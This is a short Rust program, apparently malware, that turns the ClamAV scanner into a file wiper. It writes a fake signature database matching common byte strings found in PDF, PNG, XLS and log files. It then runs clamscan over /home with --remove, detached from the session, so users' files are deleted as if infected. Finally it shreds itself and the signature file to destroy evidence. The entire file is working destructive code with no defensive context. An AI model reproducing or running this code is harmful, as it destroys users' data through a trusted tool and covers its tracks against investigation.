use std::fs::File;
use std::io::{self, Write};
use std::process::Command;

use libc::sleep;

fn build_sig_file() -> Result<(), std::io::Error> {
    let lines = [
        "pdf:0:*:504446",
        "png:0:*:504e47",
        "XLS:0:*:584c53",
        "xls:0:*:786c73",
        "log:0:*:6c6f67",
    ];

    // Create or open the file
    let mut file = File::create("muleta.ndb")?;

    // Write each line to the file
    for line in &lines {
        writeln!(file, "{}", line)?;
    }

    Ok(())
}

fn run_av() -> Result<std::process::Child, io::Error> {
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        unsafe {
            return Command::new("clamscan")
                .arg("-r")
                .arg("/home")
                .arg("-d")
                .arg("muleta.ndb")
                .arg("--max-filesize=4000M")
                .arg("--max-scansize=4000M")
                .arg("--remove")
                .pre_exec(|| {
                    // Detach the process
                    libc::setsid();
                    Ok(())
                })
                .spawn();
        };
    }
}

fn delete_evidence() {
    Command::new("shred")
        .arg("malware")
        .arg("muleta.ndb")
        .arg("-u")
        .spawn();
}

fn main() {
    build_sig_file();
    unsafe { sleep(1) };
    run_av();
    unsafe { sleep(1) };
    delete_evidence();
}
